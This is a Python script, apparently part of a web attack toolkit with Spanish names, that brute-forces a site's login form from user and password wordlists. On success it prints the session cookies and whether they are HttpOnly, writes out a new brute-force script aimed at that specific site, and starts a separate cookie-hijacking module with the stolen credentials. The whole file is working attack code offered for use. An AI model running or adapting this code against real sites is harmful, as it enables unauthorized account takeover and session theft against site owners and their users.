import requests
from bs4 import BeautifulSoup
import subprocess
from urllib.parse import urlparse
import http.cookiejar
import urllib.request
import sys
import os
current_dir = os.path.dirname(os.path.abspath(__file__))
project_dir = os.path.abspath(os.path.join(current_dir, "../../"))

sys.path.append(project_dir)
from WEB.Config import C

error_count = 0

try:
    if len(sys.argv) != 3 or sys.argv[1] != "-u":
        print
        sys.exit(1)

    url = sys.argv[2]
    script_dir = os.path.dirname(__file__)

    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36 Edg/117.0.2045.47'}

    response = requests.get(url, headers=headers)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')

    form = soup.find('form')

    if form and form.get('method'):
        method = form.get('method')
    else:
        method = 'POST'

    username_field = soup.find('input', {'type': 'text'})
    password_field = soup.find('input', {'type': 'password'})
    submit_button = soup.find('button', {'type': 'submit'}) or soup.find('input', {'type': 'submit'})

    if username_field and password_field and submit_button:
        print(f"{C.AL} brute force: {url} - {method}")
    else:
        print

    with open(f"{script_dir}/TEXT/usuarios.txt", "r") as usuarios_file:
        usuarios = usuarios_file.read().splitlines()
    with open(f"{script_dir}/TEXT/contraseñas.txt", "r") as contraseñas_file:
        contraseñas = contraseñas_file.read().splitlines()

    found_vulnerability = False
    
    parsed_url = urlparse(url)
    ulink = parsed_url.hostname + parsed_url.path.encode('ascii', 'ignore').decode('ascii')

    for usuario in usuarios:
        for contraseña in contraseñas:
            payload = {
                username_field['name']: usuario if username_field else '',
                password_field['name']: contraseña if password_field else '',
                submit_button['name']: "Login" if submit_button else ''
            }

            try:
                response = requests.request(method, url, data=payload, headers=headers)
                response.raise_for_status()

                if "Home" in response.text:
                    print(f"{C.ALO} {C.I}[{usuario}] : [{contraseña}]{C.T}", end=" ")
                    cookie_jar = http.cookiejar.CookieJar()
                    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
                    opener.addheaders = [('User-Agent', f'{headers}')]
                    response = opener.open(url)
                    for cookie in cookie_jar:
                        http_only_info = "Enabled" if cookie.has_nonstandard_attr('HttpOnly') else "Disabled"
                        print(f"\n{C.ALO} Cookie: {cookie.name} - {cookie.value}, HttpOnly : {http_only_info}")
                    found_vulnerability = True
                    a = ulink + "_forze.py"
                    try:
                        with open(a, "w", encoding="utf-8") as archivo:
                            archivo.write(
    f"#brute force: {url}\n"
    "import sys\n"
    "import requests\n\n"
    "def main():\n"
    "    if len(sys.argv) < 5 or sys.argv[1] != \"-u\" or sys.argv[3] != \"-p\":\n"
    "        print(f\"Usage: python3 {sys.argv[0]} -u <file_users> -p <file_passwords>\")\n"
    "        sys.exit(1)\n\n"
    "    usuarios_file = sys.argv[2]\n"
    "    contraseñas_file = sys.argv[4]\n\n"
    "    with open(usuarios_file, \"r\") as usuarios_file:\n"
    "        usuarios = usuarios_file.read().splitlines()\n\n"
    "    with open(contraseñas_file, \"r\") as contraseñas_file:\n"
    "        contraseñas = contraseñas_file.read().splitlines()\n\n"
    f"    url = \"{url}\"\n\n"
    f"    method = \"{method}\"\n\n"
    "    for usuario in usuarios:\n"
    "        for contraseña in contraseñas:\n"
    "            payload = {\n"
    f"                '{username_field['name']}': usuario,\n"
    f"                '{password_field['name']}': contraseña,\n"
    f"                '{submit_button['name']}': 'Login',\n"
    "            }\n\n"
    "            response = requests.request(method, url, data=payload)\n\n"
    "            if \"Home\" in response.text:\n"
    "                print(f\"Sesión iniciada correctamente con usuario: {usuario}, contraseña: {contraseña}\")\n"
    "                exit()\n"
    "            else:\n"
    "                print(f\"No se pudo iniciar sesión con usuario: {usuario}, contraseña: {contraseña}\")\n\n"
    "if __name__ == \"__main__\":\n"
    "    main()")
                        print(f"{C.GN} Generated file {a} - file brute force")
                        dir_A = os.path.dirname(__file__)
                        subprocess.run(["python3", f"{dir_A}/Cookie_hijacking.py", "-u", usuario, "-p", contraseña, "-b", submit_button['name'], "-url", url, "-Iu", username_field['name'], "-Ip", password_field['name'], method],)
                    except Exception as e:
                        print(f"\n{C.AL} Error al escribir en el archivo: {e}\n")
                    exit()
            except requests.exceptions.RequestException as e:
                print(f"Error in the request: {e}\n")
                error_count += 1

                if error_count >= 2:
                    sys.exit()

    if not found_vulnerability:
        print()

except requests.exceptions.RequestException as e:
    print(f"Error in the initial request: {e}\n")
    error_count += 1

    if error_count >= 2:
        sys.exit()

except Exception as e:
    print
    error_count += 1

    if error_count >= 2:
        sys.exit()